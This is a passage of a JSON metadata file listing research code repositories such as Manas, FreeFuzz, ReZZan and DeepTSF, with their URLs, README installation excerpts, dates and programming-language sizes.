            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 95831
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 37399
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 695
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "704": {
        "filename": "giangnm58_Manas_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/giangnm58/Manas",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\n## Installation\n### Environment Setup\nTo run Fair-AutoML, we need to install Python 3 environment on Linux. Follow these steps to clone the Fair-AutoML repository and install Fair-AutoML.\n\n1. Clone this repository and move to the directory:\n\n```\ngit clone https://github.com/giangnm58/Manas.git\ncd Manas/\n``` \n\n2. Navigate to the cloned repository: `cd Manas/` and install required packages:\n\n```\npip install -r requirements.txt\n```\n## Run the Manas tool\n\nFor optimal program execution, we employ PyCharm, a user-friendly integrated development environment.\n\nTo acquire PyCharm, visit https://www.jetbrains.com/pycharm/ and proceed with the installation.\n\nHere's a concise guide to getting started:\n\nStep 1: Launch PyCharm.\n\nStep 2: Navigate to the \"File\" menu and select \"Open.\"\n\nStep 3: Locate the Manas directory and select it to open the project.\n\n## Additional Data\n\nDue to the extensive size of the dataset, you can access the complete artifact along with the dataset by downloading it from Google Drive via the following link: [Google Drive Link](https://drive.google.com/file/d/1x8jZ27Ho9tZ5H1bVOvOCQB0xpi6n3FnN/view?usp=sharing).\n\nThe provided dataset encompasses the following components:\n\n* Python files essential for result replication.\n* Both training and testing data subsets.\n* Trained models, available as pkl files, for Original Manas, Transformed Manas, Manas, and Auto-Keras.\n* Excel files containing error rate information for Original Manas, Transformed Manas, Manas, and Auto-Keras across different time periods. These errors can also be visualized using the provided trained model pkl files.\n\n#### Model Mining\nTo mine the model, execute the following command:\n```\npython3 clone/model_mining/database_creation/model_collection.py\n```  \nThe process of mining the model will require some time investment. Fortunately, we've already completed the download of the models from the autokeras/mined_model directory. These models are stored in the format of abstract neural networks (ANN), ready for further utilization.\n\n#### Manas\nTo replicate Manas' outcomes, follow these steps:\n\n**We use Blood Cell problem as an example.**\n\nStep 1: Download the data from [Google Drive Link](https://drive.google.com/file/d/1x8jZ27Ho9tZ5H1bVOvOCQB0xpi6n3FnN/view?usp=sharing). Extract the zip file.\n\nStep 2: copy the \"Blood Cell.py\", \"xtest_bc.npy\", \"ytest_bc.npy\", \"xtrain_bc.npy\", \"ytrain_bc.npy\" to \"autokeras\"\n```\ncd Manas Data/Blood Cell\ncp xtest_bc.npy ytest_bc.npy xtrain_bc.npy ytrain_bc.npy autokeras/\ncp Classification/Blood Cell.py autokeras/\n```\n\nStep 3: Run the file \"Blood Cell.py\" to get the result.\n```\npython3 Blood Cell.py\n```\n\n**Example to evaluate trained models:**\n\nIn the folder autokeras, there is a file \"eval.py\" which contains the code to run the trained models on the testing data.\n\nStep 1: Replace \"path\" with correct path.\n\nStep 2: Run the file \"eval.py\" \n```\npython3 eval.py\n```\n\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/giangnm58/Manas/main/INSTALL.md"
            },
            {
                "result": {
                    "value": "To run Fair-AutoML, we need to install Python 3 environment on Linux. Follow these steps to clone the Fair-AutoML repository and install Fair-AutoML.\n\n1. Clone this repository and move to the directory:\n\n```\ngit clone https://github.com/giangnm58/Manas.git\ncd Manas/\n``` \n\n2. Navigate to the cloned repository: `cd Manas/` and install required packages:\n\n```\npip install -r requirements.txt\n```\n\nTo run the tool, please refer to the [installation file](/INSTALL.md) for detailed instructions. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "Environment Setup",
                    "parent_header": [
                        "Manas"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/giangnm58/Manas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The provided dataset encompasses the following components: \n",
                    "original_header": "Additional Data"
                },
                "confidence": 0.9441035401301858,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/giangnm58/Manas/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-21T10:30:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-18T21:32:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 524053
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "705": {
        "filename": "JieyuZ2_EcoAssistant_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JieyuZ2/EcoAssistant",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "All the data are included in this repository.\n\nYou only need to set your API keys in `keys.json`\n\nInstall required libraries (we recommend Python3.10):\n\n```bash\npip3 install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation",
                    "parent_header": [
                        "EcoAssistant"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JieyuZ2/EcoAssistant/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**A simplified version with latest AutoGen is in `simplified_demo.py`** \n",
                    "original_header": "EcoAssistant"
                },
                "confidence": 0.9401122691236516,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JieyuZ2/EcoAssistant/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-25T03:50:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T18:09:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 37306
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "706": {
        "filename": "ARiSE-Lab_DeepInspect_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ARiSE-Lab/DeepInspect",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-12-10T18:02:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-07T13:24:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 510513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "707": {
        "filename": "Copilot-Eval-Replication-Package_CopilotEvaluation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Copilot-Eval-Replication-Package/CopilotEvaluation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-06-27T16:10:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T11:38:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1426123
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 821
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "708": {
        "filename": "mast-group_mineSStuBs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mast-group/mineSStuBs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The tool can also easily be installed and built from source via maven.\\\nMaven will download all the required dependencies.\\\nMany thanks to Martin Monperrus for his help with this.\\\n**Important: A Maven version >= 3.2.3 is required since 15 January 2020 and onwards**\\\nMaven will download the dependencies and build the project with the command:\n```\nmvn compile\n```\nTo run the tool you can use the following command:\n```\nmvn exec:java -Dexec.mainClass=uk.ac.ed.inf.mpatsis.sstubs.mining.SStuBsMiner -Dexec.args=\"$PROJECTS_DIR DATASET_SAVE_DIR\"\n```\nPROJECTS_DIR must point to directory containing the Java repositories for mining.\nDATASET_SAVE_DIR must point to the directory in which the dataset will be saved.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation via Maven"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mast-group/mineSStuBs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "100 Java Maven Project Bugs\t\t\t\tbugs.json\\\n1000 Java Project Bugs\t\t\t\t\tbugsLarge.json\\\n100 Java Maven Project SStuBs\t\t\t\tsstubs.json\\\n1000 Java Project SStuBs\t\t\t\tsstubsLarge.json\\\n\\\nDue to a bug zenodo returns an error when uploading json files.\\\nThe .json suffix can be restored by simply renaming the files (e.g. bugs -> bugs.json). \n",
                    "original_header": "Files"
                },
                "confidence": 0.9999872219010079,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/mineSStuBs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-07T05:19:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-06T18:30:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 176499
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6913
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 107
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "709": {
        "filename": "thouyang_ccd-dsa_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/thouyang/ccd-dsa",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-11-30T04:24:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-30T08:47:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15183
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "710": {
        "filename": "NetManAIOps_CIRCA_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NetManAIOps/CIRCA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-15T04:26:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T07:33:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 201285
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 8482
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1198
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "711": {
        "filename": "masud-technope_EMSE-2019-Replication-Package_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/masud-technope/EMSE-2019-Replication-Package",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-05-12T06:47:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-02T07:54:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 37565323
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 1489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "712": {
        "filename": "ise-uiuc_FreeFuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ise-uiuc/FreeFuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Run the following command to load the database.\n\n```shell\nmongorestore dump/\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Using Our Dataset",
                    "parent_header": [
                        "FreeFuzz",
                        "Getting Started",
                        "2. Setting Up with Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ise-uiuc/FreeFuzz/main/README.md"
            },
            {
                "result": {
                    "value": "1. Go to `src/instrumentation/{torch, tensorflow}` to see how to intrument the dynamic information and add them into the database\n2. After adding invocation data, you should run the following command to preprocess the data for PyTorch\n\n```shell\ncd src && python preprocess/process_data.py torch\n```\n\nor for TensorFlow\n```shell\ncd src && python preprocess/process_data.py tf\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Collecting Data by Yourself",
                    "parent_header": [
                        "FreeFuzz",
                        "Getting Started",
                        "2. Setting Up with Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ise-uiuc/FreeFuzz/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-17T08:07:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-03T01:47:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 109581
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "713": {
        "filename": "bajinsheng_ReZZan_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bajinsheng/ReZZan",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\nsudo ./install.sh\n```\n \n",
                    "original_header": "Build"
                },
                "confidence": 0.9999288663382627,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The same as the vanillan AFL\n```\ncd AFL\nmake clean all\ncd llvm_mode\nmake clean all\n```\n \n",
                    "original_header": "Build:"
                },
                "confidence": 0.99975292315243,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "### Build:\n```shell\nsudo docker build . -t rezzan\n``` \n",
                    "original_header": "Artifact Evaluation"
                },
                "confidence": 0.9981672193435231,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\nsudo docker run -it rezzan\ncd /juliet\n./run_juliet.sh\n```\nThe final results will be shown in the terminal when the execution is done. Please see `juliet/Readme.md` for more information. The execution is expected to take several hours.\n \n",
                    "original_header": "To Reproduce RQ.1 Detection Capability:"
                },
                "confidence": 0.9975366358373224,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\nsudo docker run -it rezzan\ncd /benchmark\n./run_benchmark.sh <fuzzer> <target>\n```\nPlease choose the args from the following options: \n",
                    "original_header": "To Reproduce RQ.2 Execution Speed:"
                },
                "confidence": 0.9997916063723814,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\nsudo docker run -it rezzan\ncd /fuzzer-test-suite\n./run_fuzzer-test-suite.sh <fuzzer> <target>\n```\nPlease choose the args from the following options: \nThe fuzzing campaign will automatically stop when a crash found, so the time to reach this bug can be observed from the AFL GUI. More information please see `fuzzer-test-suite/Readme.md`\n \n",
                    "original_header": "To Reproduce RQ.4 Bug Finding Effectiveness:"
                },
                "confidence": 0.9870443197858597,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bajinsheng/ReZZan/master/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-05T08:52:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-26T19:02:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 7959375
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 96686
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 82346
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 13788
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1948
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1129
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 50
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "714": {
        "filename": "P403n1x87_flamegraph-experiment_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/P403n1x87/flamegraph-experiment",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-12-11T15:38:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-25T19:33:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10211
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 333
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "715": {
        "filename": "soarsmu_CrossASRplus_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/CrossASRplus",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "CrossASR++ is designed and tested to run with Python 3. CrossASR++ can be installed from the PyPi repository using this command\n\n```pip install crossasr```\n",
                    "type": "Text_excerpt",
                    "original_header": "1. PyPI installation",
                    "parent_header": [
                        "CrossASR++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/CrossASRplus/main/README.md"
            },
            {
                "result": {
                    "value": "The most recent version of CrossASR++ can be cloned from this repository using this command\n\n```git clone https://github.com/soarsmu/CrossASRplus```\n\nInstall CrossASR++ with the following command from the project folder CrossASRplus, using this command\n\n```pip install .```\n",
                    "type": "Text_excerpt",
                    "original_header": "2. Manual installation",
                    "parent_header": [
                        "CrossASR++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/CrossASRplus/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-07T02:39:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-23T14:45:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25528
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "716": {
        "filename": "ManuelCostanzo_Gravitational_N_Bodies_Rust_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ManuelCostanzo/Gravitational_N_Bodies_Rust",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-28T14:37:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-14T09:14:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 47450
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "717": {
        "filename": "I-NERGY_DeepTSF_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/I-NERGY/DeepTSF",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To set up DeepTSF on your local system, you need clone the main branch of this repository:\n\n```git clone https://github.com/I-NERGY/DeepTSF.git```\n\nAlternatively you can use the dedicated Github release instead of cloning the main branch.\n\nAfter that you need to navigate to the root directory of DeepTSF:\n\n```cd /path/to/repo/of/DeepTSF```\n\n\u03a4\u03bf enable the communication of the client with the logging servers (MLflow, Minio, Postgres), a .env file is needed. \nAn example (.env.example) is provided, with default environment variables.\n\nAfter that, you can set up DeepTSF either using conda (CLI for data scientists) or Docker (full deployment).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "DeepTSF"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/I-NERGY/DeepTSF/master/README.md"
            },
            {
                "result": {
                    "value": "To set up locally using docker first go to DeepTSF's root directory and rename .env.example to .env. Then run the following command in DeepTSF's root directory:\n\n```docker-compose up```\n\nDeepTSF is up and running. Navigate to [http://localhost:3000](http://localhost:3000) and start your experiments!\n\n- Optional step for advanced users: \n\nIn a new terminal window, you can copy the timeseries file you desire to run into the container, \nand then run the following to gain access to the container's file system:\n\n```docker cp <path_to_file> DeepTSF-backend:/app```\n\n```docker exec -it DeepTSF-backend bash```\n\nNow you are running bash in the main DeepTSF container! Choose the directory which best corresponds to your \nproblem, and switch to that: <br>\n- uc2 for general problems. The app will execute a national load forecasting\n  use case if from_database is set to true. So preferrably set from_database=False unless you create your own database connection.<br>\n- uc6 and uc7 are related to other use cases and are still under development.\n\nSo run the following to set up your working environment:\n```cd uc2```\n\n```conda activate DeepTSF_env```\n\n```export MLFLOW_TRACKING_URI=https://localhost:5000```\n\n```export GIT_PYTHON_REFRESH=quiet```\n\n\nThen, you can execute any experiment you want. An example working command (also demonstrated in the whitepaper [1]), is shown below:\n\n```mlflow run --experiment-name example --entry-point exp_pipeline . -P series_csv=user_datasets/Italy.csv -P convert_to_local_tz=false -P day_first=false -P from_database=false -P multiple=false -P imputation_method=peppanen -P resolution=1h -P rmv_outliers=true -P country=IT -P year_range=2015-2022 -P cut_date_val=20200101 -P cut_date_test=20210101 -P test_end_date=20211231 -P scale=true -P darts_model=NBEATS -P hyperparams_entrypoint=NBEATS_example -P loss_function=mape -P opt_test=true -P grid_search=false -P n_trials=100 -P device=gpu -P ignore_previous_runs=t -P forecast_horizon=24 -P m_mase=24 -P analyze_with_shap=False --env-manager=local```\n\nDon't forget to change series_csv argument to match the file's location in the container \n(if you followed the previous instructions it must be located in the parent directory).\n",
                    "type": "Text_excerpt",
                    "original_header": "Set up locally using Docker (Recommended)",
                    "parent_header": [
                        "DeepTSF",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/I-NERGY/DeepTSF/master/README.md"
            },
            {
                "result": {
                    "value": "This installation is only recommended for advanced users that require advanced\npipeline parameterization and functionalities such as hyperparameter tuning.\n",
                    "type": "Text_excerpt",
                    "original_header": "Bare metal installation",
                    "parent_header": [
                        "DeepTSF",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/I-NERGY/DeepTSF/master/README.md"
            },
            {
                "result": {
                    "value": "To run DeepTSF on your system you first have to install the mlflow tracking and minio server.\n\n```git clone https://github.com/I-NERGY/mlflow-tracking-server.git```\n\n```cd mlflow-server```\n\nAfter that, you need to get the server to run\n\n```docker-compose up```\n\nThe MLflow server and client may run on different computers. In this case, remember to change\nthe addresses on the .env file.\n",
                    "type": "Text_excerpt",
                    "original_header": "Set up mlflow tracking server",
                    "parent_header": [
                        "DeepTSF",
                        "Installation",
                        "Bare metal installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/I-NERGY/DeepTSF/master/README.md"
            },
            {
                "result": {
                    "value": "You can use conda.yaml to reproduce the conda environment manually. Simply \nexecute the following command which creates a new conda enviroment called\nDeepTSF_env:\n\n```cd /path/to/repo/of/DeepTSF```\n\n```conda env create -f conda.yaml```\n\nThen activate the new environment:\n\n```conda activate DeepTSF_env```\n\nAlternatively to those 2 commands, you can reproduce the conda environment automatically,\nby running any 'mlflow run' command *without* the option `--env-manager=local`. \nThis option however is not encouraged for every day use as it rebuilds the conda environment from scratch every time.\n\nThen, set the MLFLOW_TRACKING_URI to the uri of the mlflow tracking server (by default http://localhost:5000). \nPlease do not omit this step as this environment variable will not get inherited from the .env file. \n\n```export MLFLOW_TRACKING_URI=https://localhost:5000```\n\nFor the extensive DeepTSF documentation please navigate to our [Wiki](https://github.com/I-NERGY/DeepTSF/wiki/DeepTSF-documentation). \n",
                    "type": "Text_excerpt",
                    "original_header": "Set up the DeepTSF backend (CLI functionality) locally using conda.",
                    "parent_header": [
                        "DeepTSF",
                        "Installation",
                        "Bare metal installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/I-NERGY/DeepTSF/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-10T16:35:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
